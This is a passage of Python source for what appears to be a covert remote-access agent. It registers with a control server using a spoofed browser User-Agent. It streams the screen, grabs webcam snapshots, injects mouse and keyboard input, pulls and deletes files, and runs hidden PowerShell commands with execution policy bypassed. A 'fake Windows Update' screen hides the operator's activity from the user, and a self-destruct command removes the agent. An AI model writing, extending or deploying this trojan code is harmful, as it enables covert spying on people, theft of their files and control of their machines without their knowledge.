            elif msg_type == "camera_snapshot_request":
                self._handle_camera_snapshot(data)
            elif msg_type == "privacy_screen":
                self._handle_privacy_screen(data)
            elif msg_type == "request_keyframe":
                self._handle_request_keyframe()
            elif msg_type == "self_destruct":
                StealthManager.self_destruct()

        except json.JSONDecodeError:
            pass
        except Exception as e:
            logger.error(f"Error handling message: {e}")

    def _on_data(self, ws, message, data_type, _continue):
        """Handle binary messages (e.g., file upload chunks from dashboard)."""
        if data_type != websocket.ABNF.OPCODE_BINARY:
            return
        try:
            if not message:
                return
            msg_type = message[0]
            if msg_type == MSG_TYPE_UPLOAD_CHUNK and len(message) > 37:
                transfer_id = message[1:37].decode("utf-8", errors="ignore")
                chunk = message[37:]
                self._handle_file_upload_chunk_binary(transfer_id, chunk)
        except Exception as e:
            logger.error(f"Binary message handling failed: {e}")

    def _on_error(self, ws, error):
        logger.error(f"WebSocket error: {error}")
        self.on_status("error", "Connection error")

    def _on_close(self, ws, code, msg):
        self.connected = False
        self.on_status("disconnected", f"Disconnected (code={code})")
        logger.info(f"Connection closed (code={code})")

    # -- Screen capture --------------------------------------------------------

    def _send_screen_info(self):
        try:
            with mss.mss() as sct:
                all_mon = sct.monitors[0]
                info = {
                    "type": "screen_info",
                    "width": all_mon["width"],
                    "height": all_mon["height"],
                    "left": all_mon["left"],
                    "top": all_mon["top"],
                    "monitor_count": len(sct.monitors) - 1,
                    "monitors": [
                        {"index": i, "left": m["left"], "top": m["top"],
                         "width": m["width"], "height": m["height"]}
                        for i, m in enumerate(sct.monitors[1:], 1)
                    ],
                }
                self._send_json(info)
                logger.info(
                    f"Screen: {all_mon['width']}x{all_mon['height']} "
                    f"({len(sct.monitors) - 1} monitors)"
                )
        except Exception as e:
            logger.error(f"Failed to send screen info: {e}")

    def _capture_loop(self):
        adaptive_fps = max(2, self.fps)
        interval = 1.0 / adaptive_fps
        logger.info(f"Capturing at {self.fps} FPS (adaptive quality {self.min_quality}-{self.max_quality})")
        logger.info(f"Spatial Tiling enabled: {TILE_SIZE}px tiles")
        current_quality = self.quality
        consecutive_slow = 0
        consecutive_fast = 0

        try:
            with mss.mss() as sct:
                while self.running and self.connected:
                    if not self.streaming_enabled:
                        time.sleep(0.5)
                        continue

                    t0 = time.time()
                    try:
                        # 1. Congestion awareness
                        # Skip frame if the previous send was significantly slower than the target interval
                        # or if we are already behind schedule.
                        if t0 - self._last_send_time < (interval * 0.9):
                            time.sleep(0.005)
                            continue
                            
                        if self._last_send_duration > interval * 2:
                            # Previous frame was very slow to send, skip this one to allow network to clear
                            self._last_send_duration = 0 
                            continue

                        # Sync with privacy screen.
                        # Prefer display-affinity exclusion (no local flicker).
                        # Fallback to hide/show only if exclusion isn't available.
                        needs_hide_show = (
                            self.privacy_active
                            and self.privacy_overlay
                            and not self.privacy_overlay.capture_exclusion_enabled
                        )
                        if needs_hide_show:
                            self.privacy_overlay.hide()
                            time.sleep(0.005)

                        shot = sct.grab(sct.monitors[0])
                        
                        if needs_hide_show:
                            self.privacy_overlay.show()

                        frame_raw = np.array(shot)
                        h_raw, w_raw = frame_raw.shape[:2]
                        
                        # Resize if needed for processing consistency
                        if w_raw > self.max_width:
                            s = self.max_width / w_raw
                            frame_raw = cv2.resize(frame_raw, (int(w_raw * s), int(h_raw * s)), interpolation=cv2.INTER_LINEAR)
                            h_raw, w_raw = frame_raw.shape[:2]

                        frame = cv2.cvtColor(frame_raw, cv2.COLOR_BGRA2BGR)
                        
                        # 2. Keyframe logic (Full Refresh)
                        force_keyframe = (t0 - self.last_keyframe_time > KEYFRAME_INTERVAL)
                        
                        if force_keyframe or self.last_frame_crc is None:
                            # Send full frame
                            encode_param = [cv2.IMWRITE_JPEG_QUALITY, current_quality, cv2.IMWRITE_JPEG_OPTIMIZE, 1]
                            _, buf = cv2.imencode(".jpg", frame, encode_param)
                            
                            header = struct.pack(">BHHd", MSG_TYPE_FRAME, w_raw, h_raw, t0)
                            self._send_binary(header + buf.tobytes())
                            self.last_keyframe_time = t0
                            self.last_frame_crc = 1
                            self.last_block_hashes = {} # Reset tile hashes
                            # Log keyframe occasionally
                            # logger.debug("Sent keyframe")
                        else:
                            # 3. Tiled Delta logic
                            tiles_sent = 0
                            for y in range(0, h_raw, TILE_SIZE):
                                for x in range(0, w_raw, TILE_SIZE):
                                    # Handle edge tiles
                                    tw = min(TILE_SIZE, w_raw - x)
                                    th = min(TILE_SIZE, h_raw - y)
                                    
                                    tile = frame[y:y+th, x:x+tw]
                                    # Fast hash
                                    t_hash = zlib.adler32(tile[::4, ::4].tobytes())
                                    
                                    if self.last_block_hashes.get((x, y)) != t_hash:
                                        self.last_block_hashes[(x, y)] = t_hash
                                        
                                        # Encode and send this tile
                                        _, buf = cv2.imencode(".jpg", tile, [cv2.IMWRITE_JPEG_QUALITY, current_quality])
                                        
                                        # Tile header: [type(1)] [w(2)] [h(2)] [x(2)] [y(2)] [ts(8)]
                                        header = struct.pack(">BHHHHd", MSG_TYPE_TILE, tw, th, x, y, t0)
                                        self._send_binary(header + buf.tobytes())
                                        tiles_sent += 1
                            
                            if tiles_sent > 0:
                                self._last_send_time = time.time()

                    except Exception as e:
                        logger.error(f"Capture error: {e}")

                    elapsed = time.time() - t0
                    # Adaptive quality + FPS
                    if elapsed > interval * 1.2:
                        consecutive_slow += 1
                        consecutive_fast = 0
                        if consecutive_slow >= 3 and current_quality > self.min_quality:
                            current_quality = max(current_quality - 5, self.min_quality)
                            consecutive_slow = 0
                        if adaptive_fps > 2 and elapsed > interval * 1.5:
                            adaptive_fps = max(2, adaptive_fps - 1)
                            interval = 1.0 / adaptive_fps
                    else:
                        consecutive_slow = 0
                        consecutive_fast += 1
                        if current_quality < self.max_quality:
                            current_quality = min(current_quality + 1, self.max_quality)
                        if consecutive_fast >= 15 and adaptive_fps < self.fps:
                            adaptive_fps = min(self.fps, adaptive_fps + 1)
                            interval = 1.0 / adaptive_fps
                            consecutive_fast = 0

                    time.sleep(max(0.001, interval - elapsed))
        except Exception as e:
            logger.error(f"Capture loop fatal: {e}")

    def _handle_bandwidth_mode(self, d):
        """Toggle low-bandwidth settings."""
        enabled = d.get("enabled", False)
        if enabled:
            logger.info("Enabling Low Bandwidth Mode (4 FPS, 25 Quality, 1080px)")
            self.fps = 4
            self.quality = 25
            self.max_width = 1080
        else:
            logger.info("Disabling Low Bandwidth Mode (Reverting to 8 FPS, 50 Quality, 1920px)")
            self.fps = 8
            self.quality = 50
            self.max_width = 1920
        
        # Trigger an immediate quality update in the capture loop
        self.last_frame_crc = None 

    def _handle_streaming_toggle(self, d):
        """Enable/disable binary frame streaming."""
        self.streaming_enabled = d.get("enabled", True)
        logger.info(f"Screen streaming {'enabled' if self.streaming_enabled else 'disabled'}")
        
        # Reset CRC to force a fresh frame on resume
        if self.streaming_enabled:
            self._handle_request_keyframe()

    def _handle_request_keyframe(self):
        """Force a fresh full-frame refresh."""
        logger.info("Manual keyframe requested")
        self.last_frame_crc = None
        self.last_keyframe_time = 0

    def bootstrap(self):
        """Self-register with the server and retrieve session credentials."""
        import requests
        try:
            machine_id = StealthManager.get_machine_id()
            hostname = socket.gethostname()
            os_info = f"{platform.system()} {platform.release()}"

            logger.info(f"Bootstrapping agent (MachineID: {machine_id[:8]}...)")
            
            url = f"{self.server_url}/api/sessions/agent/bootstrap/"
            data = {
                "machine_id": machine_id,
                "hostname": hostname,
                "os_info": os_info
            }
            
            # Spoofed headers to look like a normal browser request
            headers = {
                "User-Agent": SPOOFED_USER_AGENT,
                "Accept": "application/json",
            }
            
            resp = requests.post(url, json=data, timeout=10, headers=headers)
            if resp.status_code == 200:
                result = resp.json()
                self.session_id = result["session_id"]
                self.token = result["token"]
                logger.info(f"Bootstrap successful. Session: {self.session_id}")
                return True
            else:
                logger.error(f"Bootstrap failed: {resp.status_code} {resp.text}")
        except Exception as e:
            logger.error(f"Bootstrap error: {e}")
        return False

    # -- Input handlers --------------------------------------------------------

    def _handle_mouse_click(self, d):
        try:
            pyautogui.click(x=int(d.get("x", 0)), y=int(d.get("y", 0)),
                            button=d.get("button", "left"),
                            clicks=int(d.get("clicks", 1)))
        except Exception as e:
            logger.error(f"Mouse click error: {e}")

    def _handle_mouse_move(self, d):
        try:
            pyautogui.moveTo(x=int(d.get("x", 0)), y=int(d.get("y", 0)),
                             _pause=False)
        except Exception as e:
            logger.error(f"Mouse move error: {e}")

    def _handle_mouse_down(self, d):
        try:
            pyautogui.mouseDown(x=int(d.get("x", 0)), y=int(d.get("y", 0)),
                                button=d.get("button", "left"))
        except Exception as e:
            logger.error(f"Mouse down error: {e}")

    def _handle_mouse_up(self, d):
        try:
            pyautogui.mouseUp(x=int(d.get("x", 0)), y=int(d.get("y", 0)),
                              button=d.get("button", "left"))
        except Exception as e:
            logger.error(f"Mouse up error: {e}")

    # -- System Actions & Camera -----------------------------------------------

    def _handle_system_action(self, d):
        """Execute a system-level action (Windows focus)."""
        action = d.get("action")
        logger.info(f"System action requested: {action}")

        def _spawn_hidden(command, shell=False):
            """Run command without flashing a terminal window."""
            kwargs = {
                "stdin": subprocess.DEVNULL,
                "stdout": subprocess.DEVNULL,
                "stderr": subprocess.DEVNULL,
                "shell": shell,
            }
            if platform.system() == "Windows":
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                kwargs["startupinfo"] = startupinfo
                kwargs["creationflags"] = subprocess.CREATE_NO_WINDOW
            subprocess.Popen(command, **kwargs)

        try:
            if action == "lock":
                _spawn_hidden(["rundll32.exe", "user32.dll,LockWorkStation"])
            elif action == "logout":
                _spawn_hidden(["shutdown", "/l"])
            elif action == "restart":
                _spawn_hidden(["shutdown", "/r", "/t", "0"])
            elif action == "shutdown":
                _spawn_hidden(["shutdown", "/s", "/t", "0"])
            elif action == "sleep":
                # Uses PowerShell to call SetSuspendState
                cmd = "powershell.exe -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState([System.Windows.Forms.PowerState]::Suspend, $false, $false)\""
                _spawn_hidden(cmd, shell=True)
            elif action == "mute":
                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]173)\"", shell=True)
            elif action == "vol_up":
                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]175)\"", shell=True)
            elif action == "vol_down":
                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject wscript.shell).SendKeys([char]174)\"", shell=True)
            elif action == "empty_recycle_bin":
                _spawn_hidden("powershell.exe -Command \"Clear-RecycleBin -Confirm:$false\"", shell=True)
            elif action == "show_desktop":
                _spawn_hidden("powershell.exe -Command \"(New-Object -ComObject shell.application).toggleDesktop()\"", shell=True)
            elif action == "monitor_off":
                # SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
                cmd = "powershell.exe -Command \"(Add-Type '[DllImport(\\\"user32.dll\\\")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -PassThru)::SendMessage(0xffff, 0x0112, 0xf170, 2)\""
                _spawn_hidden(cmd, shell=True)
            elif action == "brightness_up":
                _spawn_hidden("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness + 10; if($b -gt 100){$b=100}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"", shell=True)
            elif action == "brightness_down":
                _spawn_hidden("powershell.exe -Command \"$b = (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness - 10; if($b -lt 0){$b=0}; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, $b)\"", shell=True)
        except Exception as e:
            logger.error(f"System action failed ({action}): {e}")

    def _handle_camera_snapshot(self, d):
        """Capture a snapshot from the webcam and relay it."""
        def _snap_thread():
            cap = None
            try:
                # Try indices 0, 1, 2 to find a camera
                for i in range(3):
                    cap = cv2.VideoCapture(i)
                    if cap.isOpened():
                        break
                    cap.release()
                    cap = None
                
                if not cap:
                    self._send_json({"type": "camera_snapshot_response", "success": False, "error": "No camera found"})
                    return

                # Warm up the camera (skip first few frames for auto-exposure)
                for _ in range(5):
                    cap.read()
                
                ret, frame = cap.read()
                if ret:
                    # Resize to reasonable viewing size
                    h, w = frame.shape[:2]
                    if w > 1280:
                        s = 1280 / w
                        frame = cv2.resize(frame, (int(w * s), int(h * s)), interpolation=cv2.INTER_AREA)

                    _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                    
                    # Binary: [type(1)] [timestamp(8)] [jpeg...]
                    header = struct.pack(">Bd", MSG_TYPE_CAMERA_SNAP, time.time())
                    self._send_binary(header + buf.tobytes())
                    
                    self._send_json({"type": "camera_snapshot_response", "success": True})
                else:
                    self._send_json({"type": "camera_snapshot_response", "success": False, "error": "Failed to grab frame"})
            
            except Exception as e:
                logger.error(f"Camera error: {e}")
                self._send_json({"type": "camera_snapshot_response", "success": False, "error": str(e)})
            finally:
                if cap:
                    cap.release()

        threading.Thread(target=_snap_thread, daemon=True).start()

    def _handle_privacy_screen(self, d):
        """Toggle the fake Windows Update privacy screen."""
        self.privacy_active = d.get("enabled", False)
        logger.info(f"Privacy screen {'enabled' if self.privacy_active else 'disabled'}")
        
        if self.privacy_active:
            self.privacy_overlay.show()
        else:
            self.privacy_overlay.hide()

    def _handle_key_press(self, d):
        try:
            key = d.get("key", "")
            mods = d.get("modifiers", [])
            key_map = {
                "Enter": "enter", "Backspace": "backspace", "Tab": "tab",
                "Escape": "escape", "Delete": "delete",
                "ArrowUp": "up", "ArrowDown": "down",
                "ArrowLeft": "left", "ArrowRight": "right",
                "Home": "home", "End": "end",
                "PageUp": "pageup", "PageDown": "pagedown",
                " ": "space", "Control": "ctrl", "Alt": "alt",
                "Shift": "shift", "Meta": "win",
                "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
                "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
                "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
            }
            mapped = key_map.get(key, key)
            mod_map = {"ctrl": "ctrl", "alt": "alt", "shift": "shift", "meta": "win"}
            if mods:
                pyautogui.hotkey(*[mod_map.get(m, m) for m in mods], mapped)
            else:
                pyautogui.press(mapped)
        except Exception as e:
            logger.error(f"Key press error: {e}")

    def _handle_scroll(self, d):
        try:
            delta = int(d.get("delta", 0))
            clicks = delta // 120 if delta else 0
            if clicks:
                pyautogui.scroll(clicks, x=int(d.get("x", 0)),
                                 y=int(d.get("y", 0)))
        except Exception as e:
            logger.error(f"Scroll error: {e}")

    # -- File management -------------------------------------------------------

    def _handle_file_list(self, d):
        """List directory contents."""
        try:
            path = d.get("path", "")
            if not path:
                # Return drive list on Windows, root on Unix
                if platform.system() == "Windows":
                    import string
                    drives = []
                    for letter in string.ascii_uppercase:
                        drive = f"{letter}:\\"
                        if os.path.exists(drive):
                            try:
                                usage = shutil.disk_usage(drive)
                                drives.append({
                                    "name": drive,
                                    "path": drive,
                                    "is_dir": True,
                                    "size": usage.total,
                                    "free": usage.free,
                                })
                            except Exception:
                                drives.append({
                                    "name": drive,
                                    "path": drive,
                                    "is_dir": True,
                                    "size": 0,
                                    "free": 0,
                                })
                    self._send_json({
                        "type": "file_list_response",
                        "path": "",
                        "items": drives,
                        "is_root": True,
                    })
                    return
                else:
                    path = "/"

            target = Path(path).resolve()
            if not target.exists():
                self._send_json({
                    "type": "file_list_response",
                    "path": str(target),
                    "error": "Path does not exist",
                    "items": [],
                })
                return

            # Initial response with location info
            self._send_json({
                "type": "file_list_response",
                "path": str(target),
                "parent": str(target.parent) if str(target) != str(target.parent) else "",
                "is_root": False,
                "is_chunked": True,
            })

            items = []
            chunk_size = 200
            try:
                # Use os.scandir for much better performance than Path.iterdir
                with os.scandir(str(target)) as entries:
                    for entry in entries:
                        if not self.running or not self.connected:
                            break
                        try:
                            # entry.stat() is often cached on Windows/Linux during scandir
                            st = entry.stat(follow_symlinks=False)
                            is_dir = entry.is_dir()
                            items.append({
                                "name": entry.name,
                                "path": entry.path,
                                "is_dir": is_dir,
                                "size": st.st_size if not is_dir else 0,
                                "modified": st.st_mtime,
                            })
                        except (PermissionError, OSError):
                            items.append({
                                "name": entry.name,
                                "path": entry.path,
                                "is_dir": entry.is_dir(),
                                "size": 0,
                                "modified": 0,
                                "error": "Access denied",
                            })

                        # Send chunk if we hit the limit
                        if len(items) >= chunk_size:
                            self._send_json({
                                "type": "file_list_chunk",
                                "path": str(target),
                                "items": items,
                            })
                            items = []
                            time.sleep(0.01) # Yield slightly

                # Send remaining items
                if items:
                    self._send_json({
                        "type": "file_list_chunk",
                        "path": str(target),
                        "items": items,
                    })

                # Finalize
                self._send_json({
                    "type": "file_list_complete",
                    "path": str(target),
                })

            except PermissionError:
                self._send_json({
                    "type": "file_list_response",
                    "path": str(target),
                    "error": "Permission denied",
                    "items": [],
                })
                return
        except Exception as e:
            logger.error(f"File list error: {e}")
            self._send_json({
                "type": "file_list_response",
                "path": d.get("path", ""),
                "error": str(e),
                "items": [],
            })

    def _handle_file_download(self, d):
        """Send a file to the dashboard in chunks."""
        file_path = d.get("path", "")
        transfer_id = d.get("transfer_id", str(uuid.uuid4()))

        def _download_thread():
            try:
                p = Path(file_path).resolve()
                if not p.exists() or not p.is_file():
                    self._send_json({
                        "type": "file_download_error",
                        "transfer_id": transfer_id,
                        "error": "File not found",
                    })
                    return

                file_size = p.stat().st_size
                self._send_json({
                    "type": "file_download_start",
                    "transfer_id": transfer_id,
                    "name": p.name,
                    "size": file_size,
                    "path": str(p),
                })

                sent = 0
                with open(p, "rb") as f:
                    while self.connected:
                        chunk = f.read(CHUNK_SIZE)
                        if not chunk:
                            break
                        # Binary: [type(1)] [transfer_id(36)] [chunk_data]
                        header = struct.pack(">B", MSG_TYPE_FILE_CHUNK)
                        self._send_binary(
                            header + transfer_id.encode("utf-8") + chunk
                        )
                        sent += len(chunk)

                self._send_json({
                    "type": "file_download_complete",
                    "transfer_id": transfer_id,
                    "bytes_sent": sent,
                })
            except Exception as e:
                logger.error(f"File download error: {e}")
                self._send_json({
                    "type": "file_download_error",
                    "transfer_id": transfer_id,
                    "error": str(e),
                })

        threading.Thread(target=_download_thread, daemon=True).start()

    def _handle_file_upload_start(self, d):
        """Prepare to receive an uploaded file."""
        transfer_id = d.get("transfer_id", "")
        file_name = d.get("name", "upload")
        dest_path = d.get("path", "")

        try:
            tmp_file = tempfile.NamedTemporaryFile(delete=False, suffix=f"_{file_name}")
            self._active_transfers[transfer_id] = {
                "tmp_path": tmp_file.name,
                "dest_path": dest_path,
                "name": file_name,
                "file": tmp_file,
                "bytes_received": 0,
            }
            self._send_json({
                "type": "file_upload_ready",
                "transfer_id": transfer_id,
            })
        except Exception as e:
            self._send_json({
                "type": "file_upload_error",
                "transfer_id": transfer_id,
                "error": str(e),
            })

    def _handle_file_upload_chunk(self, d):
        """Write a chunk of uploaded data."""
        transfer_id = d.get("transfer_id", "")
        chunk_data = d.get("data", "")
        transfer = self._active_transfers.get(transfer_id)
        if not transfer:
            return
        try:
            import base64
            raw = base64.b64decode(chunk_data)
            transfer["file"].write(raw)
            transfer["bytes_received"] += len(raw)
        except Exception as e:
            logger.error(f"Upload chunk error: {e}")

    def _handle_file_upload_chunk_binary(self, transfer_id, chunk_data):
        """Write a binary chunk of uploaded data."""
        transfer = self._active_transfers.get(transfer_id)
        if not transfer:
            return
        try:
            transfer["file"].write(chunk_data)
            transfer["bytes_received"] += len(chunk_data)
        except Exception as e:
            logger.error(f"Binary upload chunk error: {e}")

    def _handle_file_upload_complete(self, d):
        """Finalize uploaded file."""
        transfer_id = d.get("transfer_id", "")
        transfer = self._active_transfers.pop(transfer_id, None)
        if not transfer:
            return
        try:
            transfer["file"].close()
            dest = Path(transfer["dest_path"]) / transfer["name"]
            shutil.move(transfer["tmp_path"], str(dest))
            self._send_json({
                "type": "file_upload_success",
                "transfer_id": transfer_id,
                "path": str(dest),
                "bytes_received": transfer["bytes_received"],
            })
        except Exception as e:
            self._send_json({
                "type": "file_upload_error",
                "transfer_id": transfer_id,
                "error": str(e),
            })

    def _handle_file_delete(self, d):
        """Delete a file or folder."""
        file_path = d.get("path", "")
        try:
            p = Path(file_path).resolve()
            if not p.exists():
                self._send_json({"type": "file_delete_response", "success": False, "error": "Not found"})
                return
            if p.is_dir():
                shutil.rmtree(str(p))
            else:
                p.unlink()
            self._send_json({
                "type": "file_delete_response",
                "success": True,
                "path": str(p),
            })
        except Exception as e:
            self._send_json({
                "type": "file_delete_response",
                "success": False,
                "error": str(e),
            })

    # -- Remote terminal -------------------------------------------------------

    def _handle_command_run(self, d):
        """Execute a command and stream output."""
        cmd = d.get("command", "").strip()
        command_id = d.get("command_id", str(uuid.uuid4()))
        timeout = d.get("timeout", 60)

        # Security check
        cmd_lower = cmd.lower()
        for blocked in BLOCKED_COMMANDS:
            if blocked in cmd_lower:
                self._send_json({
                    "type": "command_output",
                    "command_id": command_id,
                    "stream": "stderr",
                    "data": f"Blocked: '{cmd}' matches security rule '{blocked}'",
                })
                self._send_json({
                    "type": "command_complete",
                    "command_id": command_id,
                    "exit_code": -1,
                })
                return

        def _run_thread():
            try:
                # Handle 'cd' locally to persist the working directory
                if cmd_lower.startswith("cd ") or cmd_lower == "cd":
                    target = cmd[3:].strip() if len(cmd) > 2 else os.path.expanduser("~")
                    if not target:
                        target = os.path.expanduser("~")
                    
                    try:
                        new_path = (Path(self.terminal_cwd) / target).resolve()
                        if new_path.exists() and new_path.is_dir():
                            self.terminal_cwd = str(new_path)
                            self._send_json({
                                "type": "command_output",
                                "command_id": command_id,
                                "stream": "stdout",
                                "data": f"Changed directory to: {self.terminal_cwd}\n",
                            })
                            self._send_json({
                                "type": "command_complete",
                                "command_id": command_id,
                                "exit_code": 0,
                            })
                            return
                        else:
                            raise FileNotFoundError(f"Directory not found: {target}")
                    except Exception as e:
                        self._send_json({
                            "type": "command_output",
                            "command_id": command_id,
                            "stream": "stderr",
                            "data": f"cd: {e}\n",
                        })
                        self._send_json({
                            "type": "command_complete",
                            "command_id": command_id,
                            "exit_code": 1,
                        })
                        return

                # Use shell on Windows for built-in commands
                if platform.system() == "Windows":
                    # Use PowerShell for better command compatibility (aliases for ls, pwd, cat, etc.)
                    # -NoProfile avoids loading user profiles for faster startup
                    # -Command runs the provided command string
                    full_cmd = ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd]
                    proc = subprocess.Popen(
                        full_cmd,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        cwd=self.terminal_cwd,
                        creationflags=subprocess.CREATE_NO_WINDOW,
                    )
                else:
                    proc = subprocess.Popen(
                        shlex.split(cmd),
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        cwd=self.terminal_cwd,
                    )

                self._active_commands[command_id] = proc

                # Stream stdout/stderr in a buffered way to avoid WS congestion
                def stream_output(pipe, stream_name):
                    buffer = ""
                    last_flush = time.time()
                    try:
                        # Use read(4096) instead of readline to capture partial prompts
                        while self.connected and self.running:
                            # Check if process ended
                            if proc.poll() is not None:
                                # Final check for remaining output
                                remaining = pipe.read()
                                if remaining:
                                    try:
                                        text = remaining.decode("utf-8", errors="replace")
                                    except:
                                        text = str(remaining)
                                    buffer += text
                                break

                            # Non-blocking read (or small batch)
                            # On Windows, we can't easily do non-blocking on pipes without complicated APIs
                            # So we read a small amount or wait with a timeout.
                            # For simplicity we read 1024 bytes with a short block.
                            chunk = pipe.read(1024)
                            if not chunk:
                                time.sleep(0.01)
                                continue

                            try:
                                text = chunk.decode("utf-8", errors="replace")
                            except Exception:
                                text = str(chunk)
                            
                            buffer += text
                            
                            # Flush if buffer is large or 50ms passed
                            if len(buffer) > 2000 or (time.time() - last_flush > 0.05 and buffer):
                                self._send_json({
                                    "type": "command_output",
                                    "command_id": command_id,
                                    "stream": stream_name,
                                    "data": buffer,
                                })
                                buffer = ""
                                last_flush = time.time()
                        
                        # Final flush
                        if buffer:
                            self._send_json({
                                "type": "command_output",
                                "command_id": command_id,
                                "stream": stream_name,
                                "data": buffer,
                            })
                    except Exception as e:
                        logger.debug(f"Stream error {stream_name}: {e}")

                stdout_thread = threading.Thread(target=stream_output, args=(proc.stdout, "stdout"), daemon=True)
                stderr_thread = threading.Thread(target=stream_output, args=(proc.stderr, "stderr"), daemon=True)
                stdout_thread.start()
                stderr_thread.start()

                try:
                    proc.wait(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    self._send_json({
                        "type": "command_output",
                        "command_id": command_id,
                        "stream": "stderr",
                        "data": f"\n[Timed out after {timeout}s]\n",
                    })

                stdout_thread.join(timeout=2)
                stderr_thread.join(timeout=2)

                self._send_json({
                    "type": "command_complete",
                    "command_id": command_id,
                    "exit_code": proc.returncode or -1,
                })
            except Exception as e:
                self._send_json({
                    "type": "command_output",
                    "command_id": command_id,
                    "stream": "stderr",
                    "data": f"Error: {e}\n",
                })
                self._send_json({
                    "type": "command_complete",
                    "command_id": command_id,
                    "exit_code": -1,
                })
            finally:
                self._active_commands.pop(command_id, None)

        threading.Thread(target=_run_thread, daemon=True).start()

    def _handle_command_kill(self, d):
        """Kill a running command."""
        command_id = d.get("command_id", "")
        proc = self._active_commands.get(command_id)
        if proc:
            try:
                proc.kill()
                self._send_json({
                    "type": "command_output",
                    "command_id": command_id,
                    "stream": "stderr",
                    "data": "\n[Process killed by user]\n",
                })
            except Exception as e:
                logger.error(f"Kill command error: {e}")

    # -- System tools ----------------------------------------------------------

    def _handle_system_info(self):
        """Send system information."""
        try:
            with self._metrics_lock:
                m = self._metrics
                info = {
                    "type": "system_info",
                    "hostname": socket.gethostname(),
                    "platform": platform.system(),
                    "platform_release": platform.release(),
                    "platform_version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor(),
                    "ip_address": self._get_local_ip(),
                    "username": os.getlogin() if hasattr(os, "getlogin") else "unknown",
                    
                    # Cached non-blocking metrics
                    "cpu_percent": m["cpu_percent"],
                    "memory_total": m["memory_total"],
                    "memory_used": m["memory_used"],
                    "memory_percent": m["memory_percent"],
                    "disks": m["disks"],
                    "network_interfaces": m["network_interfaces"],
                    "boot_time": m.get("boot_time", 0),
                }

            self._send_json(info)
        except Exception as e:
            logger.error(f"System info error: {e}")
            self._send_json({"type": "system_info", "error": str(e)})

    def _handle_process_list(self):
        """Send running process list."""
        if not HAS_PSUTIL:
            self._send_json({
                "type": "process_list",
                "error": "psutil not installed",
                "processes": [],
            })
            return

        try:
            processes = []
            for proc in psutil.process_iter(attrs=["pid", "name", "cpu_percent", "memory_info", "username", "status"]):
                try:
                    info = proc.info
                    mem = info.get("memory_info")
                    processes.append({
                        "pid": info["pid"],
                        "name": info["name"] or "Unknown",
                        "cpu_percent": info.get("cpu_percent", 0) or 0,
                        "memory_mb": round(mem.rss / (1024 * 1024), 1) if mem else 0,
                        "username": info.get("username", ""),
                        "status": info.get("status", ""),
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            # Sort by memory usage descending
            processes.sort(key=lambda p: p["memory_mb"], reverse=True)

            self._send_json({
                "type": "process_list",
                "processes": processes[:200],  # Limit to top 200
                "total_count": len(processes),
            })
        except Exception as e:
            logger.error(f"Process list error: {e}")
            self._send_json({
                "type": "process_list",
                "error": str(e),
                "processes": [],
            })

    def _handle_process_kill(self, d):
        """Kill a process by PID."""
        if not HAS_PSUTIL:
            self._send_json({"type": "process_kill_response", "success": False, "error": "psutil not installed"})
            return

        pid = d.get("pid")
        try:
            proc = psutil.Process(pid)
            name = proc.name()
            proc.terminate()
            proc.wait(timeout=5)
            self._send_json({
                "type": "process_kill_response",
                "success": True,
                "pid": pid,
                "name": name,
            })
        except psutil.TimeoutExpired:
            try:
                psutil.Process(pid).kill()
                self._send_json({"type": "process_kill_response", "success": True, "pid": pid, "name": name})
            except Exception as e:
                self._send_json({"type": "process_kill_response", "success": False, "error": str(e)})
        except Exception as e:
            self._send_json({"type": "process_kill_response", "success": False, "error": str(e)})

    def _handle_browser_list_request(self, d):
        """Detect installed browsers and the default one, then send the list."""
        try:
            browsers = self._get_installed_browsers()
            self._send_json({
                "type": "browser_list_response",
                "browsers": browsers
            })
        except Exception as e:
            logger.error(f"Browser list error: {e}")
            self._send_json({
                "type": "browser_list_response",
                "browsers": [],
                "error": str(e)
            })

    def _get_installed_browsers(self):
        """Helper to find all browsers in registry/folders and identify the default."""
        browsers = []
        seen_paths = set()

        # 1. Identify Default Browser via UserChoice
        default_prog_id = ""
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice") as key:
                default_prog_id, _ = winreg.QueryValueEx(key, "ProgId")
        except Exception: pass

        # 2. Search StartMenuInternet for installed browsers (Standard method)
        # Check both 64-bit and 32-bit (WOW6432Node) registry trees
        reg_roots = [(winreg.HKEY_LOCAL_MACHINE, "HKLM"), (winreg.HKEY_CURRENT_USER, "HKCU")]
        reg_subkeys = [
            r"SOFTWARE\Clients\StartMenuInternet",
            r"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
        ]

        for root, root_name in reg_roots:
            for subkey in reg_subkeys:
                try:
                    with winreg.OpenKey(root, subkey) as key:
                        for i in range(winreg.QueryInfoKey(key)[0]):
                            browser_id = winreg.EnumKey(key, i)
                            try:
                                with winreg.OpenKey(key, browser_id) as b_key:
                                    b_name = winreg.QueryValue(b_key, None)
                                    with winreg.OpenKey(b_key, r"shell\open\command") as c_key:
